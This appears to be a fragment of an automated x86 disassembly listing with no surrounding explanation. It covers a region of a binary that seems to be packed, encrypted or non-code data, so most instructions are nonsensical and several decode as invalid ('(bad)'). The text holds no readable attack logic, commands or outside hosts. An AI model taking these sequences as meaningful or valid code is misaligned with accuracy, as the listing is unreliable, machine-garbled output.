  4209df:	jp     0x420a18
  4209e1:	pop    esp
  4209e2:	xchg   BYTE PTR [ebx+0x3a],bh
  4209e5:	adc    esi,DWORD PTR [edi]
  4209e7:	fisttp QWORD PTR [eax]
  4209e9:	mov    ds:0xa528479e,eax
  4209ee:	pop    ds
  4209ef:	pop    edx
  4209f0:	call   0xc55c71a
  4209f5:	ja     0x420a21
  4209f7:	shr    ebx,0x48
  4209fa:	dec    eax
  4209fb:	xor    ebp,DWORD PTR [ecx+0x2be80c9b]
  420a01:	sub    esp,DWORD PTR [eax-0x460e4e57]
  420a07:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  420a09:	xor    BYTE PTR [eax-0x78b23ff9],ch
  420a0f:	pop    ds
  420a10:	imul   esi,DWORD PTR [ecx+0x37c3c746],0x41df081e
  420a1a:	aam    0x2b
  420a1c:	out    0xd,eax
  420a1e:	call   0xb5216f81
  420a23:	mov    bh,0x86
  420a25:	cmp    bh,ch
  420a27:	cmp    eax,0x6f6efb27
  420a2c:	pop    ebx
  420a2d:	mov    ds:0xe16fc285,al
  420a32:	lea    esi,[edx+0x93]
	...
  420a94:	add    BYTE PTR [eax],al
  420a96:	fbstp  TBYTE PTR [edx]
  420a98:	scas   eax,DWORD PTR es:[edi]
  420a99:	adc    ebp,edi
  420a9b:	lahf   
  420a9c:	(bad)  
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   BYTE PTR ds:0xa568710c,ch
  420aa7:	pop    edx
  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [eax],ah
  420aaf:	xchg   esi,eax
  420ab0:	mov    dh,0xfb
  420ab2:	retf   0x2803
  420ab5:	pop    es
  420ab6:	sub    eax,0x96f4b72e
  420abb:	arpl   WORD PTR [esi-0x6e],bp
  420abe:	mov    ecx,gs
  420ac0:	pop    eax
  420ac1:	xlat   BYTE PTR ds:[ebx]
  420ac2:	mov    BYTE PTR [esp+esi*4+0x12],dl
  420ac6:	inc    ebx
  420ac7:	xchg   edx,eax
  420ac8:	push   edi
  420ac9:	or     DWORD PTR [ebx-0x4c0795d4],0xaa948cda
  420ad3:	test   al,0x97
  420ad5:	sub    eax,0x84a7cd7
  420ada:	jne    0x420afc
  420adc:	sub    eax,0x4bbee825
  420ae1:	sbb    eax,DWORD PTR [edx+0x3c]
  420ae4:	xor    DWORD PTR [edi-0x59],ebp
  420ae7:	fbld   TBYTE PTR [eax-0x5e]
  420aea:	sar    BYTE PTR [ecx+0x61b47d66],1
  420af0:	add    BYTE PTR [eax+0x34b95ba4],bh
  420af6:	int    0x30
  420af8:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420afa:	shr    BYTE PTR [esi-0x4e],cl
  420afd:	js     0x420b4f
  420aff:	cmp    eax,0x90897344
  420b04:	add    ebp,DWORD PTR [ebx]
  420b06:	inc    edi
  420b07:	push   es
  420b08:	sahf   
  420b09:	push   ss
  420b0a:	fsubr  st(2),st
  420b0c:	adc    BYTE PTR gs:[edi-0x70951191],ch
  420b13:	sti    
  420b14:	mov    ax,0x3b10
  420b18:	xchg   esp,eax
  420b19:	icebp  
  420b1a:	(bad)  
  420b1b:	call   DWORD PTR [ecx+edi*1+0x4e56995f]
  420b22:	gs mov al,0x58
  420b25:	pop    ebx
  420b26:	push   edi
  420b27:	fimul  DWORD PTR [edx-0x2c]
  420b2a:	jl     0x420b38
  420b2c:	rcr    BYTE PTR [eax-0x47],cl
  420b2f:	adc    DWORD PTR [edi+0x13],0x71
  420b33:	xchg   esi,eax
  420b34:	sbb    DWORD PTR [esi-0x677fdf3d],0x23
  420b3b:	aas    
  420b3c:	push   edi
  420b3d:	xor    ecx,DWORD PTR [ecx+0x3a]
  420b40:	or     al,0xd0
  420b42:	fs inc ecx
  420b44:	pop    edx
  420b45:	sbb    eax,0xcb7ebd01
  420b4a:	or     BYTE PTR [eax+0x31],bl
  420b4d:	sbb    esp,DWORD PTR [edx+edx*4]
  420b50:	dec    ecx
  420b51:	out    0x9b,eax
  420b53:	and    DWORD PTR [ecx],esi
  420b55:	xor    BYTE PTR [ebx],cl
  420b57:	jb     0x420b69
  420b59:	add    DWORD PTR [ecx-0x310aa70e],ebx
  420b5f:	test   al,0xf9
  420b61:	inc    edx
  420b62:	pop    edi
  420b63:	enter  0xf624,0xa1
  420b67:	sbb    bl,cl
  420b69:	loop   0x420b52
  420b6b:	gs sbb al,0xf2
  420b6e:	lock fcomp QWORD PTR [edx-0xe76126f]
  420b75:	in     eax,dx
  420b76:	fsubr  QWORD PTR [ecx-0x2b]
  420b79:	ret    0x12f2
  420b7c:	dec    edx
  420b7d:	jmp    0xb47cd964
  420b82:	dec    edx
  420b83:	popa   
  420b84:	fiadd  WORD PTR [esp+eax*4-0x22]
  420b88:	outs   dx,BYTE PTR ds:[esi]
  420b89:	and    esi,DWORD PTR [ebx+0x77e9b6b0]
  420b8f:	dec    ebx
  420b90:	ficom  DWORD PTR [edi]
  420b92:	into   
  420b93:	fistp  WORD PTR [ecx]
  420b95:	pusha  
  420b96:	inc    ebx
  420b97:	repnz ror esp,1
  420b9a:	cwde   
  420b9b:	mov    bl,0xd0
  420b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b9e:	hlt    
  420b9f:	cli    
  420ba0:	int3   
  420ba1:	sub    edx,edi
  420ba3:	mov    dh,0xde
  420ba5:	(bad)
  420ba8:	xor    al,0x9
  420baa:	out    0x56,eax
  420bac:	sbb    ebx,DWORD PTR [edi+0x55e6a886]
  420bb2:	mov    BYTE PTR [ecx-0x6a],al
	...
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	pop    esi
  420c23:	push   edi
  420c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c25:	inc    ecx
  420c26:	lods   al,BYTE PTR ds:[esi]
  420c27:	pop    ebx
  420c28:	add    DWORD PTR [eax],eax
  420c2a:	pop    es
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [esi-0x76540b1b],dh
  420c33:	pop    es
  420c34:	mov    dl,0xf6
  420c36:	dec    edi
  420c37:	sar    BYTE PTR [ebx],1
  420c39:	mov    ebp,0x2bfddcef
  420c3e:	fdiv   QWORD PTR [edi-0x50b51a1]
  420c44:	cmp    ecx,ebp
  420c46:	hlt    
  420c47:	inc    edx
  420c48:	adc    BYTE PTR [ecx-0x77],al
  420c4b:	clc    
  420c4c:	pop    ds
  420c4d:	sbb    esp,DWORD PTR [edx-0x39]
  420c50:	mov    ebx,0xf3e86108
  420c55:	xor    eax,0xb7a4df0c
  420c5a:	pop    esi
  420c5b:	and    eax,0x957b4272
  420c60:	fcomp  QWORD PTR [edi-0x80]
  420c63:	iret   
  420c64:	popf   
  420c65:	xchg   edi,eax
  420c66:	int3   
  420c67:	push   ebp
  420c68:	mov    ah,0xc9
  420c6a:	ficomp WORD PTR [eax+0x31b66476]
  420c70:	loope  0x420c28
  420c72:	mov    edi,ds
  420c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c75:	rcr    DWORD PTR [ecx+edi*4+0x22],0x9
  420c7a:	std    
  420c7b:	jmp    0x420c69
  420c7d:	dec    ebx
  420c7e:	dec    edi
  420c7f:	ss daa 
  420c81:	les    ebx,FWORD PTR [edx-0x71]
  420c84:	ror    eax,cl
  420c86:	ret    0xd5b6
  420c89:	xchg   ebx,eax
  420c8a:	jb     0x420cf9
  420c8c:	push   eax
  420c8d:	xor    BYTE PTR [edi],al
  420c8f:	push   ebx
  420c90:	in     eax,dx
  420c91:	adc    esi,DWORD PTR [esi-0x2772e585]
  420c97:	dec    ecx
  420c98:	and    eax,0x6ff411c4
  420c9d:	idiv   DWORD PTR [edi+eax*1+0x15]
  420ca1:	xor    BYTE PTR [eax],bh
  420ca3:	mov    ah,al
  420ca5:	rcr    DWORD PTR [edx+0x2fd97fc1],0x55
  420cac:	dec    edx
  420cad:	push   edx
  420cae:	pushf  
  420caf:	rol    DWORD PTR [eax],1
  420cb1:	xchg   edi,eax
  420cb2:	mov    BYTE PTR [ebp-0x2f],al
  420cb5:	jb     0x420ceb
  420cb7:	outs   dx,BYTE PTR ds:[esi]
  420cb8:	mov    cl,0xca
  420cba:	fs (bad) 
  420cbc:	push   edi
  420cbd:	pushf  
  420cbe:	bnd jnp 0x420c79
  420cc1:	and    ch,ah
  420cc3:	outs   dx,DWORD PTR ds:[esi]
  420cc4:	out    dx,eax
  420cc5:	push   esi
  420cc6:	or     al,0x85
  420cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc9:	sub    eax,0x1b513feb
  420cce:	mov    ecx,0x451c966b
  420cd3:	jmp    FWORD PTR [esi]
  420cd5:	inc    edx
  420cd6:	retf   
  420cd7:	retf   
  420cd8:	mov    BYTE PTR [edi+ebp*8+0x46],0x68
  420cdd:	mov    bh,0xda
  420cdf:	xchg   edi,eax
  420ce0:	popa   
  420ce1:	jmp    0x420cb8
  420ce3:	mov    ebx,0x526829fb
  420ce8:	imul   edi,DWORD PTR [esi-0x79],0x87c39173
  420cef:	push   ds
  420cf0:	call   0x37c18370
  420cf5:	pop    ss
  420cf6:	aam    0xb5
  420cf8:	xlat   BYTE PTR ds:[ebx]
  420cf9:	push   cs
  420cfa:	cmp    ch,BYTE PTR [eax+0x1d91ccab]
  420d00:	sbb    bl,BYTE PTR [ebp-0x6f]
  420d03:	jmp    0x1f800db2
  420d08:	shl    DWORD PTR [esi],0x3e
  420d0b:	(bad)  
  420d0c:	jge    0x420ce4
  420d0e:	(bad)  
  420d0f:	ds scas al,BYTE PTR es:[edi]
  420d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d12:	sub    DWORD PTR [edx+0x226413ee],0x21c7f7bd
  420d1c:	test   BYTE PTR ds:0x629fef4f,al
  420d22:	inc    ecx
  420d23:	out    dx,al
  420d24:	outs   dx,DWORD PTR ds:[esi]
  420d25:	ss fwait
  420d27:	xor    eax,0x4b93cafe
  420d2c:	sar    ebx,cl
  420d2e:	scas   eax,DWORD PTR es:[edi]
  420d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d30:	sti    
  420d31:	out    0xe1,al
  420d33:	stos   DWORD PTR es:[edi],eax
  420d34:	mov    esp,0x0
	...
  420d95:	add    bh,ah
  420d97:	push   ds
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x5f0c1cea
  420da3:	fwait
  420da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420da5:	shl    DWORD PTR [ebx+0x700015c],0x1
  420dac:	add    BYTE PTR [eax],al
  420dae:	xchg   esp,eax
  420daf:	mov    ebx,0x9164dfb3
  420db4:	shl    bl,1
  420db6:	in     al,0xc9
  420db8:	(bad)  
  420db9:	popa   
  420dba:	jb     0x420d83
  420dbc:	mov    ch,0x54
  420dbe:	icebp  
  420dbf:	loop   0x420d62
  420dc1:	mov    al,0xd8
  420dc3:	add    DWORD PTR [ecx-0x1980199c],0x25
  420dca:	mov    ecx,0x6ff2de5c
  420dcf:	add    DWORD PTR [edx+esi*8],esp
  420dd2:	(bad)  
  420dd3:	aam    0x7a
  420dd5:	jmp    0x420d9e
  420dd7:	stos   DWORD PTR es:[edi],eax
  420dd8:	popa   
  420dd9:	or     al,0x6c
  420ddb:	mov    ch,0x18
  420ddd:	sub    eax,0xf50f6b33
  420de2:	inc    ebx
  420de3:	mov    dl,0x53
  420de5:	mov    bh,0x64
  420de7:	sbb    BYTE PTR ds:0x8227c0eb,ch
  420ded:	jg     0x420dfc
  420def:	inc    ebx
  420df0:	push   edi
  420df1:	lock add al,0x8
  420df4:	sti    
  420df5:	(bad)  
  420df6:	lea    edx,[ebx]
  420df8:	mov    al,0xc7
  420dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dfb:	cmp    dh,dh
  420dfd:	jbe    0x420dd9
  420dff:	pop    ebx
  420e00:	in     eax,dx
  420e01:	jmp    0xc7794a7a
  420e06:	dec    ebp
  420e07:	xchg   ecx,eax
  420e08:	jns    0x420dfd
  420e0a:	pop    ebx
  420e0b:	test   al,0xf1
  420e0d:	adc    al,0x30
  420e0f:	cli    
  420e10:	jo     0x420dd2
  420e12:	nop
  420e13:	jg     0x420e42
  420e15:	push   ebp
  420e16:	lds    esp,FWORD PTR [esi+0x63]
  420e19:	ret    
  420e1a:	mov    edx,0xfe3385bf
  420e1f:	push   esi
  420e20:	call   0x59a8:0xbe3c5eeb
  420e27:	retf   0x287d
  420e2a:	sbb    DWORD PTR [edx-0x1b],ebx
  420e2d:	call   0x6d01eac7
  420e32:	or     BYTE PTR [ebx],bh
  420e34:	pop    ds
  420e35:	xor    DWORD PTR [ebx-0x28ff7057],0xffffff8e
  420e3c:	retf   
  420e3d:	add    cl,ah
  420e3f:	int3   
  420e40:	or     eax,0x62f0a253
  420e45:	sub    esp,DWORD PTR [esi-0x6]
  420e48:	mov    ch,0x54
  420e4a:	xchg   ebp,eax
  420e4b:	adc    ch,BYTE PTR [esi]
  420e4d:	ds call 0x69a:0x56c4cd2
  420e55:	adc    ebx,esp
  420e57:	enter  0x67a6,0x7c
  420e5b:	outs   dx,BYTE PTR ds:[esi]
  420e5c:	xchg   esi,eax
  420e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e5e:	pop    ds
  420e5f:	repnz mov DWORD PTR [ecx-0x6ceddc1a],esp
  420e66:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  420e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e69:	in     eax,dx
  420e6a:	xchg   esi,eax
  420e6b:	leave  
  420e6c:	add    ch,cl
  420e6e:	in     eax,0xf
  420e70:	out    dx,al
  420e71:	jmp    0xb191:0xc06fcd1d
  420e78:	fsubr  QWORD PTR [edi+0x3e]
  420e7b:	push   0x2
  420e7d:	(bad)  
  420e7e:	mov    ah,0xda
  420e80:	dec    ebp
  420e81:	jb     0x420e70
  420e83:	hlt    
  420e84:	mov    esi,0x22976565
  420e89:	in     eax,dx
  420e8a:	jo     0x420ea8
  420e8c:	pusha  
  420e8d:	mov    ch,0xf2
  420e8f:	mov    ecx,0xd8871183
  420e94:	jo     0x420eb2
  420e96:	pusha  
  420e97:	push   es
  420e98:	add    eax,0xe0576f07
  420e9d:	fmul   DWORD PTR [esi+eax*8+0x33d1b41b]
  420ea4:	cld    
  420ea5:	stc    
  420ea6:	repnz dec ebp
  420ea8:	scas   eax,DWORD PTR es:[edi]
  420ea9:	stos   DWORD PTR es:[edi],eax
  420eaa:	mov    dl,0xa3
  420eac:	sbb    BYTE PTR [edi],ah
  420eae:	jae    0x420eed
  420eb0:	sub    ebp,DWORD PTR [ebx+0x5e]
  420eb3:	xor    eax,DWORD PTR [esi+0x0]
	...
  420f15:	add    BYTE PTR [eax],ah
  420f17:	xchg   edi,eax
  420f18:	inc    edx
  420f19:	shl    edi,cl
  420f1b:	xlat   BYTE PTR ds:[ebx]
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	ds shr ebx,0xe6
  420f25:	lock mov edx,0x700015d
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [ebx-0x787c71a0],ah
  420f33:	or     esi,eax
  420f35:	sahf   
  420f36:	ja     0x420f01
  420f38:	sar    BYTE PTR [eax-0x4740ef1f],1
  420f3e:	dec    ebx
  420f3f:	sub    BYTE PTR [esi],bh
  420f41:	xlat   BYTE PTR ds:[ebx]
  420f42:	mov    ecx,0x54cc8f95
  420f47:	sbb    DWORD PTR [edi+0x62],edx
  420f4a:	shl    BYTE PTR ds:[ecx+0x6e90070b],1
  420f51:	sub    eax,0xb97a904
  420f56:	out    0x52,eax
  420f58:	ins    BYTE PTR es:[edi],dx
  420f59:	ins    BYTE PTR es:[edi],dx
  420f5a:	(bad)  
  420f5b:	nop
  420f5c:	push   ecx
  420f5d:	adc    edi,DWORD PTR [edx-0x77]
  420f60:	mov    esp,0x9626373b
  420f65:	dec    ebp
  420f66:	loop   0x420f23
  420f68:	in     eax,dx
  420f69:	andnps xmm4,XMMWORD PTR [esi]
  420f6c:	mov    esp,0x73688607
  420f71:	das    
  420f72:	sbb    DWORD PTR [esi],edx
  420f74:	xchg   ebx,eax
  420f75:	fidiv  DWORD PTR [ebp+0x37]
  420f78:	mov    DWORD PTR [eax+0x76],esi
  420f7b:	lea    ebp,[eax]
  420f7d:	xchg   esi,eax
  420f7e:	adc    DWORD PTR [esi+0x6448a5bb],ebp
  420f84:	loopne 0x420fee
  420f86:	fxam   
  420f88:	aam    0xcc
  420f8a:	add    eax,0xe4c4b864
  420f8f:	mov    ebx,0xb9a967d6
  420f94:	cmp    al,0xcb
  420f96:	mov    dl,BYTE PTR [edi+ebp*4-0x20]
  420f9a:	into   
  420f9b:	push   0x43fbf1a7
  420fa0:	aaa    
  420fa1:	je     0x420fb0
  420fa3:	sub    al,bh
  420fa5:	gs pop eax
  420fa7:	out    0xa5,eax
  420fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420faa:	mov    edx,0xb0843052
  420faf:	sbb    bl,BYTE PTR [edx+ebx*1+0x4f]
  420fb3:	or     al,0x4e
  420fb5:	mov    WORD PTR [edx],gs
  420fb7:	push   ss
  420fb8:	shl    DWORD PTR [ecx+0x54],1
  420fbb:	adc    edx,0x64cf7a3b
  420fc1:	cmc    
  420fc2:	ror    DWORD PTR [edx+0x7fdcadc9],0x81
  420fc9:	stos   DWORD PTR es:[edi],eax
  420fca:	popf   
  420fcb:	sub    BYTE PTR [esi+0x3f],al
  420fce:	jmp    0xef5b28d7
  420fd3:	scas   eax,DWORD PTR es:[edi]
  420fd4:	nop
  420fd5:	push   cs
  420fd6:	sbb    al,0x8b
  420fd8:	iret   
  420fd9:	mul    BYTE PTR [ebx+edx*4+0x4ea3a897]
  420fe0:	fmul   DWORD PTR [eax+ecx*4+0x73]
  420fe4:	nop
  420fe5:	cmp    eax,0x4588c484
  420fea:	mov    ah,0x64
  420fec:	add    BYTE PTR [ebx-0x62],bh
  420fef:	fst    DWORD PTR [edx]
  420ff1:	adc    DWORD PTR [ecx-0x23],esp
  420ff4:	ins    BYTE PTR es:[edi],dx
  420ff5:	or     eax,ebp
  420ff7:	out    0xf0,al
  420ff9:	or     bx,ax
  420ffc:	pop    ds
  420ffd:	(bad)  
  420ffe:	loop   0x420fea
  421000:	shr    DWORD PTR [ebx+0x529a795f],0x57
  421007:	pop    eax
  421008:	out    dx,al
  421009:	int3   
  42100a:	lds    ebp,FWORD PTR [ebx-0x5c]
  42100d:	add    al,0xe5
  42100f:	fwait
  421010:	into   
  421011:	push   es
  421012:	fisttp QWORD PTR [esi-0x3e]
  421015:	adc    eax,0x94aaaf84
  42101a:	sub    BYTE PTR ds:0x135b9bed,ch
  421020:	fcomp  DWORD PTR [ebp-0x3b]
  421023:	add    ebp,DWORD PTR [ebx-0x57]
  421026:	in     al,dx
  421027:	sbb    esp,DWORD PTR [edi]
  421029:	sub    al,0x96
  42102b:	in     eax,dx
  42102c:	mov    bh,0xb
  42102e:	pop    ds
  42102f:	ret    0x8577
  421032:	in     al,0x2a
  421034:	into   
	...
  421095:	add    BYTE PTR [edi-0x243925a2],bl
  42109b:	(bad)  
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x7b535efe
  4210a5:	push   esp
  4210a6:	rcr    DWORD PTR [esi+0x1],0x0
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [edx],bl
  4210af:	(bad)  
  4210b0:	mov    dl,0x45
  4210b2:	mov    ds:0xdf2bc474,eax
  4210b7:	clc    
  4210b8:	call   0xce58:0x2e9ba854
  4210bf:	sub    ecx,esp
  4210c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210c2:	mov    dh,0x67
  4210c4:	test   BYTE PTR [ebp-0x26],bl
  4210c7:	sbb    eax,0x6e7052a
  4210cc:	aaa    
  4210cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210ce:	fisubr WORD PTR [edx+0xe]
  4210d1:	push   es
  4210d2:	les    esi,FWORD PTR [ecx]
  4210d4:	add    esp,DWORD PTR [edx]
  4210d6:	in     eax,0x8b
  4210d8:	(bad)  
  4210d9:	lock sar DWORD PTR [ebp-0x6e],1
  4210dd:	int    0x1
  4210df:	and    ebx,edx
  4210e1:	dec    edi
  4210e2:	xor    al,0xb0
  4210e4:	aam    0x68
  4210e6:	mov    cl,0x1b
  4210e8:	dec    esi
  4210e9:	sbb    BYTE PTR [ecx],ch
  4210eb:	mov    bl,0xac
  4210ed:	outs   dx,BYTE PTR ds:[esi]
  4210ee:	cmp    DWORD PTR [ecx-0x1bb33c01],edi
  4210f4:	dec    ecx
  4210f5:	das    
  4210f6:	xchg   edi,esp
  4210f8:	pop    es
  4210f9:	cdq    
  4210fa:	fmul   QWORD PTR [edi-0xd]
  4210fd:	sbb    DWORD PTR [eax+0x607e4930],eax
  421103:	pop    edx
  421104:	dec    eax
  421105:	in     eax,0x77
  421107:	jg     0x4210f4
  421109:	loope  0x421150
  42110b:	pushf  
  42110c:	loop   0x42118c
  42110e:	dec    esi
  42110f:	in     eax,dx
  421110:	add    edx,DWORD PTR [edi-0x24]
  421113:	sbb    BYTE PTR [ebp-0x7d],0x8e
  421117:	imul   edi,ebp,0x31
  42111a:	stos   DWORD PTR es:[edi],eax
  42111b:	add    dl,BYTE PTR [edx-0x76592a0]
  421121:	arpl   sp,cx
  421123:	push   esp
  421125:	mul    DWORD PTR [ecx+0x65]
  421128:	adc    al,0x16
  42112a:	add    esp,DWORD PTR [ecx]
  42112c:	pop    ds
  42112d:	outs   dx,DWORD PTR ds:[esi]
  42112e:	mov    esi,0xb0023f06
  421133:	jmp    0x89a13cd9
  421138:	jge    0x4211b6
  42113a:	mov    WORD PTR [ebx-0x7c],fs
  42113d:	mov    ebx,0x192b2aa0
  421142:	lods   eax,DWORD PTR ds:[esi]
  421143:	gs dec edx
  421145:	in     al,dx
  421146:	push   ebp
  421147:	lea    eax,[edi+0x6234f6c]
  42114d:	in     al,0xa8
  42114f:	pop    esi
  421150:	dec    DWORD PTR [eax]
  421152:	jle    0x4210e0
  421154:	in     al,0x63
  421156:	xor    eax,0xdd73a211
  42115b:	cmc    
  42115c:	xchg   esp,eax
  42115d:	mov    ah,0x26
  42115f:	dec    DWORD PTR [esi-0x41]
  421162:	mov    edi,0x51e6f1b3
  421167:	in     eax,dx
  421168:	clc    
  421169:	cdq    
  42116a:	add    DWORD PTR [edx-0x64],0x4a
  42116e:	push   ss
  42116f:	sbb    al,0x79
  421171:	test   BYTE PTR [edi+ebx*1+0x32],bh
  421175:	or     eax,0x4d1dab48
  42117a:	mov    esi,0x473a85ae
  42117f:	test   DWORD PTR [esi],ebp
  421181:	jle    0x4211e8
  421183:	jae    0x4211dd
  421185:	add    ecx,DWORD PTR [ebx+0x2f]
  421188:	push   ds
  421189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42118a:	int    0xda
  42118c:	outs   dx,DWORD PTR ds:[esi]
  42118d:	add    dl,BYTE PTR [ebx+0x5eb19988]
  421193:	adc    eax,DWORD PTR [edx-0x45]
  421196:	pusha  
  421197:	inc    ebp
  421198:	pop    ds
  421199:	pop    edi
  42119a:	mov    al,0xf
  42119c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42119e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42119f:	test   edi,edi
  4211a1:	je     0x421159
  4211a3:	ret    0xd2c7
  4211a6:	outs   dx,DWORD PTR ds:[esi]
  4211a7:	mov    BYTE PTR ds:0x8d2e46da,ch
  4211ad:	ss push 0x5e4b8b37
  4211b3:	in     al,0xf3
	...
  421215:	add    BYTE PTR [esi-0x700870e1],bl
  42121b:	idiv   esi
  42121d:	jg     0x421280
  42121f:	pop    es
  421220:	and    BYTE PTR [ecx+0x5a],cl
  421223:	sub    eax,0x5fc82491
  421228:	add    DWORD PTR [eax],eax
  42122a:	pop    es
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR [ebx+ebx*2],al
  421230:	(bad)  
  421231:	shr    DWORD PTR [eax],0x67
  421234:	(bad)  
  421235:	dec    esp
  421236:	fcmove st,st(1)
  421238:	push   0x63
  42123a:	jmp    0x384551d3
  42123f:	jge    0x42122b
  421241:	cmp    BYTE PTR [edx+0x4b00ef9],dl
  421247:	iret   
  421248:	inc    esi
  421249:	aam    0xef
  42124b:	fnsave [ebp-0x7a]
  42124e:	pop    ebp
  42124f:	sub    DWORD PTR [ecx+0x23],0xffffffcd
  421253:	inc    ebp
  421254:	loopne 0x4212ce
  421256:	cmp    al,0xf1
  421258:	cmp    al,BYTE PTR [edx]
  42125a:	retf   0x6d38
  42125d:	idiv   edx
  42125f:	or     BYTE PTR [edi+0x23],cl
  421262:	test   BYTE PTR [edx+edi*2],dl
  421265:	enter  0xb183,0xc0
  421269:	sbb    DWORD PTR [esp+eax*8-0x9],esi
  42126d:	xchg   ebp,eax
  42126e:	int    0x64
  421270:	jge    0x4212b1
  421272:	fbld   TBYTE PTR [edi*4+0x23352fc3]
  421279:	loop   0x421257
  42127b:	mov    bh,0x45
  42127d:	bound  edi,QWORD PTR ds:0xde6cd258
  421283:	int    0x4e
  421285:	push   cs
  421286:	cmp    al,0x6c
  421288:	jnp    0x4212e4
  42128a:	push   eax
  42128b:	sbb    bh,cl
  42128d:	aad    0xa1
  42128f:	lds    ecx,FWORD PTR [ecx]
  421291:	add    ebp,DWORD PTR [eax+ebp*2-0x797be159]
  421298:	cmp    ecx,ecx
  42129a:	push   edi
  42129b:	push   eax
  42129c:	icebp  
  42129d:	enter  0xcfa3,0x70
  4212a1:	(bad)  
  4212a2:	in     eax,0x76
  4212a4:	inc    ebx
  4212a5:	(bad)  
  4212a7:	ins    BYTE PTR es:[edi],dx
  4212a8:	mov    edi,0xd4b2d1e7
  4212ad:	loope  0x42127b
  4212af:	pop    edi
  4212b0:	mov    ecx,DWORD PTR [edx+0x7b]
  4212b3:	jmp    0x421267
  4212b5:	call   0xb07d600a
  4212ba:	mov    DWORD PTR [edi+0x144d0e34],esi
  4212c0:	rol    ebx,1
  4212c2:	inc    eax
  4212c3:	inc    ebx
  4212c4:	test   eax,0xea9bb4a
  4212c9:	out    0x29,eax
  4212cb:	imul   edi,DWORD PTR [esi*1-0x65fa1f1b],0x13
  4212d3:	sub    eax,0xa597bcf7
  4212d8:	or     ah,BYTE PTR [ebp+0x49]
  4212db:	dec    ebx
  4212dc:	cdq    
  4212dd:	(bad)  
  4212de:	in     eax,dx
  4212df:	jae    0x421322
  4212e1:	cmp    ah,dl
  4212e3:	push   edx
  4212e4:	loop   0x4212d0
  4212e6:	dec    edi
  4212e7:	cmp    ecx,0xfffffffa
  4212ea:	test   al,0x5
  4212ec:	push   edx
  4212ed:	pop    ss
  4212ee:	ficom  DWORD PTR [ebx-0x78]
  4212f1:	inc    edx
  4212f2:	gs or  al,al
  4212f5:	int3   
  4212f6:	mov    bh,0x5f
  4212f8:	and    dl,BYTE PTR [ecx+0x3a]
  4212fb:	sub    al,0x58
  4212fd:	inc    ecx
  4212fe:	aad    0x26
  421300:	adc    eax,0x62fcd9d3
  421305:	aam    0x81
  421307:	out    dx,al
  421308:	das    
  421309:	and    BYTE PTR ds:0x872623c,ah
  42130f:	jnp    0x421330
  421311:	(bad)  
  421312:	gs inc edx
  421314:	fld    TBYTE PTR [eax+edi*2]
  421317:	arpl   WORD PTR [esi],sp
  421319:	fnsave [edi+0x73f0d8ab]
  42131f:	xor    al,0x3d
  421321:	es cli 
  421323:	dec    edx
  421324:	jecxz  0x4212f3
  421326:	lea    esp,[ecx]
  421328:	outs   dx,DWORD PTR ds:[esi]
  421329:	bound  edx,QWORD PTR [edx+0x63]
  42132c:	stc    
  42132d:	scas   eax,DWORD PTR es:[edi]
  42132e:	inc    edx
  42132f:	shl    BYTE PTR [ecx],0x9a
  421332:	rol    DWORD PTR [ebp+eax*1+0x0],0x0
	...
  421393:	add    BYTE PTR [eax],al
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0xb46c04b0
  4213a3:	jmp    0x6111e7fe
  4213a8:	add    DWORD PTR [eax],eax
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [ebp+0x6f],dh
  4213b0:	pop    ss
  4213b1:	sti    
  4213b2:	sub    ebx,DWORD PTR [eax-0x36ba2e65]
  4213b8:	fmul   QWORD PTR [eax+eiz*2+0x37]
  4213bc:	pop    edi
  4213bd:	shl    DWORD PTR [edx],1
  4213bf:	and    al,0xe4
  4213c1:	retf   
  4213c2:	sti    
  4213c3:	xor    edi,DWORD PTR [edi+0x2b05aca3]
  4213c9:	imul   edi,DWORD PTR [eax-0xfcfd63b],0xffffff9f
  4213d0:	push   0xffffffe3
  4213d2:	test   eax,0x2e49071e
  4213d7:	mov    ebx,0x4ab0718a
  4213dc:	jno    0x4213e3
  4213de:	data16 adc al,BYTE PTR [esi-0x1e]
  4213e2:	mov    WORD PTR [ecx+ecx*1-0x7dc75bf0],?
  4213e9:	je     0x4213b8
  4213eb:	and    dl,0x4b
  4213ee:	std    
  4213ef:	push   cs
  4213f0:	inc    eax
